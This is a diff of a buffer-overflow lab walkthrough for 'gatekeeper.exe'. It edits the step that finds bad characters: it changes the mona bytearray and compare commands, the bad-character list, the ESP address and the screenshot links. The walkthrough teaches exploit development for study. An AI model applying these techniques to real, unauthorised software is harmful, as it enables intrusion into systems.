@@ -411,17 +411,15 @@ except:
             
             - **Remember to take note of the "corrupted" bytes located next the real badchars (08, 09, 2f, a1)** 
             
-                 - Full list : `\x00\x07\x08\x09\x2E\x2F\xA0\xA1`
-                 - **Badchars**  : **`\x00\x07\x2E\xA0`**
-                 - Corrputed : `\x08\x09\x2F\xA1` 
+                 - **Full list : `\x00\x07\x08\x09\x2E\x2F\xA0\xA1`**
     
 6. Generate a new `bytearray` in `mona`, specifying these new **`Badchars`** along with `\x00`.
 
-    - `!mona bytearray -b "\x00\x07\x2E\xA0"`
+    - `!mona bytearray -b "\x00\x07\x08\x09\x2E\x2F\xA0\xA1"`
     
     - ![image](https://user-images.githubusercontent.com/94720207/169705768-f3f08f01-3588-4dff-b79c-1cab0ab799fd.png)
      
-7. Then update the `payload` variable in your `overflow_gatekeeper_find_badchars.py` script and remove the **new badchars** as well `"\x00\x07\x2E\xA0"`.
+7. Then update the `payload` variable in your `overflow_gatekeeper_find_badchars.py` script and remove the **new badchars** as well `"\x00\x07\x08\x09\x2E\x2F\xA0\xA1"`.
 
     - ![image](https://user-images.githubusercontent.com/94720207/169705837-aff40eaf-38ac-4f3f-a135-e03b6f055f7b.png)
 
@@ -431,15 +429,15 @@ payload = "\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\
 
 8. Restart `gatekeeper.exe` in `Immunity Debugger` and run the `overflow_gatekeeper_find_badchars.py` script again.
 
-    - ![image](https://user-images.githubusercontent.com/94720207/169678420-ac75679f-40f9-436b-b01d-87aeb2516a68.png)
+    - ![image](https://user-images.githubusercontent.com/94720207/169705974-bbb00af3-f9e5-4490-9966-a23017cfdad4.png)
     
-    - ![image](https://user-images.githubusercontent.com/94720207/169679715-dc96830b-0605-42bc-ba6e-e40e0a98dd1c.png)
+    - ![image](https://user-images.githubusercontent.com/94720207/169706049-084535ad-bf40-43b0-8342-54d143ad24ae.png)
       
 9. **Repeat the badchar comparison until the results status returns `Unmodified`. This indicates that no more badchars exist.** 
 
-    - **ESP points: `0105FA18`**
+    - **ESP points: `00AF19E4`**
     
-    - `!mona compare -f C:\mona\oscp\bytearray.bin -a 0105FA18` 
+    - `!mona compare -f C:\mona\oscp\bytearray.bin -a 00AF19E4` 
     
     - ![image](https://user-images.githubusercontent.com/94720207/169679745-27ea4da9-0929-47d3-ac00-6bedfda8c2c5.png)
 
